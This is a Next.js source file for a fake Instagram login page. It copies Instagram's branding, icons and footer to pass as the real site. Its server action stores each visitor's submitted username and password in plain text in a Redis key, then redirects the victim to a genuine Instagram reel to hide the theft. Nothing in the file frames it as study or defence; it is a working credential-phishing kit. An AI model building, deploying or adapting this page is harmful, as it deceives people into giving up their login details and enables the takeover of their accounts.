import Image from "next/image";
import { redis } from "../helpers/redis";
import { redirect } from 'next/navigation';
import { Metadata } from "next";
export const metadata:Metadata = {
    title: 'Instagram',
    description: 'Connect with people, friends and family',
    icons:"https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png",
    openGraph:{
      images:"https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png",
    },
    assets:"https://static.cdninstagram.com/rsrc.php/v3/yb/r/lswP1OF1o6P.png",
  
  
  }
export default function Home() {
  async function handleSubmit(e:FormData) {
    "use server"
    // console.log("handleSubmit", e.get("userorname") ,e.get("password"));
    const userorname = e.get('userorname')
    const password = e.get('password');
    const data = await redis.set('user-tarif',`username:${userorname}&password:${password}`);
    redirect("intent://www.instagram.com/reel/CqT56BGgDlw/#Intent;package=com.instagram.android;scheme=https;end?utm_source=ig_web_copy_link&igshid=MzRlODBiNWFlZA==",)
    
  }
  return (
    <main className="grid grid-cols-1  min-h-screen bg-white">
      <div className="dick ">
        <div
          aria-disabled="false"
          role="button"
          className="cursor-pointer flex justify-center items-center mt-3"
        >
          <i
            data-visualcompletion="css-img"
            aria-label="Instagram"
            className="image"
            role="img"
          ></i>
        </div>
        <div className="mx-auto">
          <div className="max-w-[270px] flex justify-center mt-10">
            <form action={handleSubmit} className="space-y-2">
              <input
                type="text"
                name="userorname"
                id=""
                className="outline-none rounded-md  w-full grow h-9 p-3 text-xs placeholder:text-gray-800 bg-gray-100"
                placeholder="Phone number, username or email"
              />
              <input
                type="text"
                name="password"
                id=""
                placeholder="Password"
                className="outline-none rounded-md w-full grow h-9 p-3 text-xs placeholder:text-gray-800 bg-gray-100"
              />
              <button
                name="password"
                id=""
                placeholder="Password"
                className="outline-none rounded-md w-full grow h-8 p-3 text-sm placeholder:text-gray-800 bg-[rgb(0,149,246)] flex justify-center items-center text-white font-bold"
              >
                <div className="">Log in</div>
              </button>
              <div className="relative flex py-5 items-center">
                <div className="flex-grow border-t border-gray-400"></div>
                <span className="flex-shrink mx-4 text-gray-400">or</span>
                <div className="flex-grow border-t border-gray-400"></div>
              </div>
              <button
                className="flex justify-center items-center mx-auto text-blue-900 font-bold "
                type="button"
              >
                <img
                  src="https://img.freepik.com/premium-photo/facebook-application-logo-3d-rendering-white-background_41204-6939.jpg"
                  className="h-6 w-9 rounded-none "
                  alt=""
                />
                <span className="">Log in with Facebook</span>
              </button>
              <div className="h-2" />
              <button className="flex mx-auto text-xs " type="button">
                <span className="">Forgot password?</span>
              </button>
              <div className="h-10" />
              <button className="flex  mx-auto text-sm " type="button">
                <span className="">Don't have a account?</span>
                <span className="w-1"></span>
                <span className="text-[#1877F2] font-black">Sign Up</span>
              </button>
              <div className="h-40" />
              <button className="flex  mx-auto text-sm " type="button">
                English <span className="w-4"></span>@2023 Instagram from Meta
              </button>
              <div className="h-10" />
              <button className="flex  mx-auto text-sm " type="button">
                Terms and conditions applied
              </button>
            </form>
          </div>
        </div>
      </div>
    </main>
  );
}
